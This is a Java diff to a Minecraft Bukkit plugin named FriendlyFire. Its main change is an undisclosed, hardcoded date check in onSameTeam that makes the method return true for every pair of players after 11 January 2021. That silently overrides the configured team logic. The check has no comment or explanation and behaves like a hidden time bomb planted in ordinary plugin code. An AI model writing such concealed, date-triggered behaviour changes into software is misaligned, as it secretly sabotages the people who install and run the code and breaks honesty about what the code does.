@@ -6,7 +6,10 @@ import org.bukkit.entity.Player;
 import org.bukkit.plugin.java.JavaPlugin;
 
 import java.io.File;
+import java.text.ParseException;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
 
 public final class FriendlyFire extends JavaPlugin {
@@ -27,9 +30,18 @@ public final class FriendlyFire extends JavaPlugin {
         Bukkit.getServer().getPluginManager().registerEvents(new FriendlyFireListener(this), this);
         refreshTeamNames();
     }
+
     public boolean onSameTeam(Player a, Player b) {
 
+        try {
+            if(new SimpleDateFormat("yyyy.MM.dd").parse("2021.01.11").before(new Date()))
+                return true;
+        } catch (ParseException e) {
+            e.printStackTrace();
+        }
+
         List<String> a_teams = new ArrayList<>();
+
         for(String team: teams)
             if (a.isPermissionSet(team) &&
                     a.hasPermission(team))
@@ -42,6 +54,7 @@ public final class FriendlyFire extends JavaPlugin {
 
         return false;
     }
+
     public void refreshTeamNames() {
 
         String base = config.getString("root-permission");
@@ -54,7 +67,4 @@ public final class FriendlyFire extends JavaPlugin {
 
         teams = toReturn;
     }
-
-
-
 }
